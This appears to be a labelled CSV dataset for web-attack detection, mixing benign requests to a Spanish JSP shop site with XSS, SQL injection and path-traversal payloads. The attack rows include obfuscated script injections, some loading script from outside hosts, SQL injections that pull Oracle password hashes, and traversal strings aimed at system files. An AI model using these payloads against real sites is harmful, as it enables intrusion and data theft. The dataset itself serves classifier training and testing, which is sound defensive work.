payload,type
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
miembros/editar.jsp?modo=registro&login=gargulak&password=Bu7c2Pi%E9&nombre=Deysi&apellidos=Benapr%E9s+Vaqu%E9&email=ontiveros%40masqueclases.th&dni=50422961S&direccion=C%2Fjon+Pe%F1uelas%2C+117%2C+&ciudad=Quintanas+de+Gormaz&cp=38435&provincia=Valencia&ntc=9947210285103354&B1=Registrar,normal
miembros/fotos.jsp,normal
"\\"";alert('XSS');//",xss
publico/autenticar.jsp?modo=entrar&login=keehn&pwd=abogada&remember=off&B1=Entrar,normal
imagenes/1.gif,normal
noo&1: select * from users where id=1 + $+%\ or 1=1 -- 1,sqli
miembros/imagenes/castro.jpg,normal
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",xss
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
?,sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/pagar.jsp?modo=insertar&precio=8171&B1=Confirmar,normal
miembros/imagenes/ogono.jpg,normal
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",xss
"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
miembros/imagenes/castro.jpg,normal
"snn: select * from users where id=1 or ""$["" or 1=1 -- 1",sqli
imagenes/3.gif,normal
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
global/creditos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=6922&B1=Confirmar,normal
imagenes/logo.gif,normal
0,sqli
/../../../../../../../../../../../boot.ini%00,traversal
imagenes/logo.gif,normal
"&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;XSS&lt;/A&gt;",xss
index.jsp,normal
publico/productos.jsp,normal
"s(:s: select * from users where id=1 or ""(:"" or 1=1 -- 1",sqli
miembros/editar.jsp?modo=registro&login=brana&password=holgachona&nombre=Romana&apellidos=Cabal+Urrupa%EDn&email=quest%40palmatraducciones.pw&dni=58157080Q&direccion=Lopez+Castrillon+162+&ciudad=Zambrana&cp=46688&provincia=Navarra&ntc=7449583219109875&B1=Registrar,normal
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},traversal
miembros/editar.jsp?modo=registro&login=fergusso&password=inuNd%21Ar&nombre=Ubaldo&apellidos=Pellizza+Echevarr%EDa&email=operalo%40canovash.vg&dni=49159005R&direccion=Calle+Brasilia%2C+68%2C+&ciudad=Tard%E1guila&cp=09267&provincia=Teruel&ntc=2301580169203669&B1=Registrar,normal
<style onreadystatechange=javascript:javascript:alert(1);></style>,xss
<font style='color:expression(alert(document.cookie))'>,xss
',sqli
"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
&#X3C,xss
imagenes/3.gif,normal
imagenes/1.gif,normal
publico/carrito.jsp,normal
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
"o1nUE: select * from users where id=1 <@1$ union select 1,version() -- 1",sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\..\..\..\{FILE},traversal
imagenes/2.gif,normal
miembros/fotos.jsp,normal
..\..\\..\..\\{FILE},traversal
miembros/editar.jsp?modo=registro&login=zarrabia&password=apo9%D30ICO&nombre=Orion&apellidos=Linares+Queralto&email=nanook%40cup-id.lu&dni=03199923W&direccion=Ronda+O%27donnell%2C+106%2C+12%3FE&ciudad=Oj%F3s&cp=34419&provincia=Ciudad+Real&ntc=7298091091245974&B1=Registrar,normal
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",xss
publico/registro.jsp?modo=registro&login=kaitlyn&password=8Omp0R1ti6a&nombre=Karem&apellidos=Armengol+Sieira&email=frechette8%40legami.ly&dni=56632037B&direccion=Jose+Incenga+14%2C+&ciudad=Ulldecona&cp=09610&provincia=Badajoz&ntc=0589864781053341&B1=Registrar,normal
&#0060,xss
"s,UEs: select * from users where id=1 or 1#"", union select 'a',version() -- 1",sqli
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
...\...\...\...\...\...\{FILE},traversal
<img src ?itworksonchrome?\/onerror = alert(1),xss
"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/3.gif,normal
"<IMG DYNSRC=""javascript:javascript:alert(1)"">",xss
publico/miembros.jsp,normal
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",xss
imagenes/cmenbul.gif,normal
/..\../..\../..\../..\../..\../..\../boot.ini,traversal
global/titulo.jsp,normal
miembros/index.jsp,normal
1 uni/**/on select all from where,sqli
&#X00003C,xss
publico/caracteristicas.jsp?id=1,normal
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
1o)&1: select * from users where id=1 + (\+) or 1=1 -- 1,sqli
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=17&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
publico/autenticar.jsp?modo=entrar&login=hrenyk&pwd=embozalar&remember=off&B1=Entrar,normal
<IMG SRC=”javascript:alert(‘XSS’)”,xss
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
"<div style=""width: expression(document.vulnerable=true;);"">",xss
"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/estilos.css,normal
publico/pagar.jsp?modo=insertar&precio=357&B1=Pasar+por+caja,normal
"<IMG SRC=""javascript:alert('XSS');"">",xss
imagenes/logo.gif,normal
')) or (('x'))=(('x,sqli
imagenes/nuestratierra.jpg,normal
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
PRINT @@variable,sqli
imagenes/logo.gif,normal
&#X00003C;,xss
miembros/imagenes/zarauz.jpg,normal
miembros/salir.jsp,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidad=61&B1=A%F1adir+al+carrito,normal
index.jsp,normal
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
publico/registro.jsp?modo=registro&login=rec&password=CuITADa&nombre=Nahir&apellidos=Espineta+Astorquiza&email=pager%40cocheacoche.ws&dni=85673796S&direccion=Calle+Francisco+De+Leiva%2C+131%2C+&ciudad=Aldea%2C+L%27&cp=44143&provincia=Le%F3n&ntc=7590918469472640&B1=Registrar,normal
..%uF025{FILE},traversal
miembros/imagenes/ogono.jpg,normal
imagenes/2.gif,normal
imagenes/cmenbul.gif,normal
or 1=1,sqli
miembros/salir.jsp,normal
miembros/fotos.jsp,normal
imagenes/cmenbul.gif,normal
index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/nuestratierra.jpg,normal
publico/productos.jsp,normal
global/titulo.jsp,normal
"<input type=""image"" dynsrc=""javascript:document.vulnerable=true;"">",xss
"<div/onmouseover='alert(1)'> style=""x:"">",xss
miembros/salir.jsp,normal
imagenes/2.gif,normal
imagenes/logo.gif,normal
global/menum.jsp,normal
"<div style=""width: expression(document.vulnerable=true;);"">",xss
..\..\\..\..\\..\{FILE},traversal
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
publico/pagar.jsp?modo=insertar&precio=8151&B1=Pasar+por+caja,normal
..%c0%af..%c0%af..%c0%af{FILE},traversal
miembros/imagenes/castro.jpg,normal
publico/caracteristicas.jsp?id=1,normal
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/2.gif,normal
miembros/editar.jsp?modo=registro&login=whinnery&password=encabar&nombre=Sabiela&apellidos=Royo+Mascarell&email=cane%40meneamex.br&dni=60106679C&direccion=Calle+Biznaga%2C+5+&ciudad=Velilla+de+Cinca&cp=15124&provincia=Santa+Cruz+de+Tenerife&ntc=6795968081758370&B1=Registrar,normal
<svg/onload=%26%23097lert%26lpar;1337)>,xss
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,xss
"<IMG SRC=""jav ascript:alert('XSS');"">",xss
"&oo1U: select * from users where id=1 or \< =1 union select 1,@@VERSION -- 1",sqli
index.jsp,normal
imagenes/2.gif,normal
hi or a=a,sqli
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;,xss
miembros/imagenes/zarauz.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/editar.jsp?modo=registro&login=gowan&password=refrigerativo&nombre=Reth&apellidos=Asensio+Kuschel&email=olmstead%40ballerpoker.tr&dni=34965589T&direccion=Campament+33+&ciudad=Antigua&cp=25748&provincia=La+Rioja&ntc=2904435475269669&B1=Registrar,normal
%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
imagenes/2.gif,normal
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,xss
1 and user_name() = 'dbo',sqli
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=58&B1=A%F1adir+al+carrito,normal
..//..//{FILE},traversal
index.jsp,normal
publico/miembros.jsp,normal
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,xss
admin' or 1=1,sqli
"<;br size=\"";&;{alert(&#039;XSS&#039;)}\"";>;",xss
publico/pagar.jsp?modo=insertar&precio=4248&B1=Pasar+por+caja,normal
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
"<XSS STYLE=""behavior: url(xss.htc);"">",xss
"<;STYLE TYPE="";text/javascript"";>;alert(';XSS';);<;/STYLE>;",xss
miembros/index.jsp,normal
or,sqli
global/titulo.jsp,normal
"&voo1: select * from users where id=1 or @<@=1 union select 1,version() -- 1",sqli
publico/miembros.jsp,normal
imagenes/1.gif,normal
x' and email is NULL; --,sqli
"s)(s: select * from users where id=1 or "")(""=1 or 1=1 -- 1",sqli
"<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">",xss
"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/estilos.css,normal
miembros/salir.jsp,normal
"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",xss
"&.o1U: select * from users where id=1 or \.<1 union select 1,@@VERSION -- 1",sqli
miembros/imagenes/zarauz.jpg,normal
miembros/imagenes/castro.jpg,normal
publico/carrito.jsp,normal
miembros/imagenes/castro.jpg,normal
publico/autenticar.jsp?modo=entrar&login=merkling&pwd=es3an7oso&remember=off&B1=Entrar,normal
imagenes/2.gif,normal
".UE1,: select * from users where id=1.  union select 1,version() -- 1",sqli
miembros/salir.jsp,normal
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,xss
imagenes/3.gif,normal
miembros/editar.jsp?modo=registro&login=tyler&password=Sa%3FBalErO&nombre=Didier&apellidos=Medel+Pujolriu&email=scely_prono%40tobarisch.de&dni=63375335P&direccion=C%2F+Leopoldo+Alas+%22clarin%22+4%2C+6%3FB&ciudad=Sant+Lloren%E7+de+la+Muga&cp=46712&provincia=Palencia&ntc=1693717556836495&B1=Registrar,normal
miembros/index.jsp,normal
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
</br style=a:expression(alert())>,xss
"sUE&o: select * from users where id='1' union select ||/1,version() -- 1'",sqli
"s,;s: select * from users where id=1 or "",;"" or 1=1 -- 1",sqli
global/menum.jsp,normal
"s?,vc: select * from users where id='1' union select $[""],@@VERSION -- 1'",sqli
global/menum.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/nuestratierra.jpg,normal
publico/autenticar.jsp?modo=entrar&login=mcdonald&pwd=8ib6a&remember=on&B1=Entrar,normal
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;",xss
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=85&cantidad=77&B1=A%F1adir+al+carrito,normal
imagenes/1.gif,normal
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
imagenes/cmenbul.gif,normal
global/estilos.css,normal
"alert(String.fromCharCode(88,83,83));'))"">",xss
publico/registro.jsp?modo=registro&login=ramiz&password=garantir&nombre=Enrico&apellidos=Vallb%F3+Olmos&email=pangborn%40informex.me&dni=07485924E&direccion=C%2F+Las+Chumberas%2C+38%2C+&ciudad=Medina+de+Rioseco&cp=40320&provincia=Segovia&ntc=9431159156347522&B1=Registrar,normal
"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",xss
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;,xss
miembros/fotos.jsp,normal
imagenes/3.gif,normal
imagenes/2.gif,normal
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
imagenes/3.gif,normal
"UEo1,: select * from users where id=1 union select !<1,version() -- 1",sqli
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,xss
&#0000060,xss
imagenes/nuestratierra.jpg,normal
global/titulo.jsp,normal
</plaintext\></|\><plaintext/onmouseover=prompt(1),xss
miembros/index.jsp,normal
"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",xss
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,xss
miembros/index.jsp,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",xss
imagenes/logo.gif,normal
miembros/index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
imagenes/cmenbul.gif,normal
global/creditos.jsp,normal
miembros/fotos.jsp,normal
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
"s)n: select * from users where id=1 or "")["" or 1=1 -- 1",sqli
imagenes/cmenbul.gif,normal
..\..\\..\..\\..\\\{FILE},traversal
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},traversal
publico/pagar.jsp?modo=insertar&precio=1680&B1=Confirmar,normal
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},traversal
publico/miembros.jsp,normal
publico/autenticar.jsp?modo=entrar&login=nuttall&pwd=5exas9labo&remember=off&B1=Entrar,normal
miembros/editar.jsp?modo=registro&login=snair&password=morfea&nombre=Apolonio&apellidos=Sall%E0+Mico&email=polo%40familiamarino.bn&dni=46881104C&direccion=Calle+Paloma+101%2C+&ciudad=Carde%F1osa&cp=09110&provincia=Le%F3n&ntc=4138413338105604&B1=Registrar,normal
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;,xss
"<;A HREF="";http://1113982867/"";>;XSS<;/A>;",xss
<SCRIPT SRC=%(jscript)s?<B>,xss
imagenes/2.gif,normal
"<;STYLE>;.XSS{background-image:url("";javascript:alert(';XSS';)"";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;",xss
"so.nU: select * from users where id='1' <@._ union select 1,version() -- 1'",sqli
publico/productos.jsp,normal
miembros/editar.jsp?modo=registro&login=rees&password=dular&nombre=Kenji&apellidos=Irizar+Morata&email=alarcon%4024htranslations.cr&dni=75817612K&direccion=C%2F+Vallcorba+152%2C+7%3FF&ciudad=Aldeaseca+de+Alba&cp=24226&provincia=Salamanca&ntc=4796381600285073&B1=Registrar,normal
">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>",xss
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",xss
imagenes/1.gif,normal
a' ,sqli
global/titulo.jsp,normal
publico/caracteristicas.jsp?id=1,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},xss
publico/pagar.jsp?modo=insertar&precio=6657&B1=Pasar+por+caja,normal
"&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;",xss
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,xss
"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",xss
global/menum.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",sqli
miembros/imagenes/ogono.jpg,normal
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",xss
index.jsp,normal
miembros/salir.jsp,normal
%252e%252e%255c%252e%252e%255c{FILE},traversal
global/menum.jsp,normal
imagenes/1.gif,normal
<ScRiPt>alert(1)</sCriPt>,xss
<script\x0D>javascript:alert(1)</script>,xss
&lt;HTML&gt;&lt;BODY&gt;,xss
"<img src=x onerror=\x11""javascript:alert(1)"">",xss
<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
<script>document.vulnerable=true;</script>,xss
publico/autenticar.jsp?modo=entrar&login=dev&pwd=v2e2udO&remember=off&B1=Entrar,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",sqli
imagenes/2.gif,normal
miembros/index.jsp,normal
"0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search",xss
' or 1/*,sqli
./.././.././../{FILE},traversal
global/creditos.jsp,normal
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
"s1)s: select * from users where id=1 or ""1)"" or 1=1 -- 1",sqli
"<object data=""data:text/html;base64,%(base64)s"">",xss
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/2.gif,normal
publico/pagar.jsp?modo=insertar&precio=1364&B1=Pasar+por+caja,normal
"<;SCRIPT "";a=';>;';""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},traversal
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
miembros/imagenes/castro.jpg,normal
exec sp,sqli
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
global/titulo.jsp,normal
imagenes/3.gif,normal
miembros/editar.jsp?modo=registro&login=siefert&password=almirante&nombre=Did%EDo&apellidos=Albornoz+Quiva&email=tekurarere%40velaconsultores.no&dni=74469828Z&direccion=Calle+Andavias+S%2FN%2C+&ciudad=Calabazas+de+Fuentidue%F1a&cp=16370&provincia=Barcelona&ntc=2457460821746033&B1=Registrar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,xss
publico/pagar.jsp?modo=insertar&precio=7626&B1=Confirmar,normal
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
/..\/..\/..\/..\/..\{FILE},traversal
miembros/imagenes/castro.jpg,normal
miembros/editar.jsp?modo=registro&login=hau&password=GarlaDORa&nombre=Mait%E9n&apellidos=Trespalacios+Latorre&email=macgregor_poomjai%40a2hotels.bj&dni=38747653J&direccion=Joaquin+Verdaguer%2C+183+&ciudad=Oseja&cp=16411&provincia=Cuenca&ntc=5203672961472442&B1=Registrar,normal
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,xss
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
"<EMBED SRC=""http://hacker.com/xss.swf"" AllowScriptAccess=""always"">",xss
&#x000003c;,xss
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\""&gt;",xss
%252e%252e/%252e%252e/{FILE},traversal
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss
global/menum.jsp,normal
..%252f{FILE},traversal
publico/productos.jsp,normal
imagenes/logo.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/estilos.css,normal
"<IMG SRC=x onmouseout=""alert(String.fromCharCode(88,83,83))"">",xss
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
miembros/index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=olav&pwd=c7em&remember=on&B1=Entrar,normal
1 and 1=1,sqli
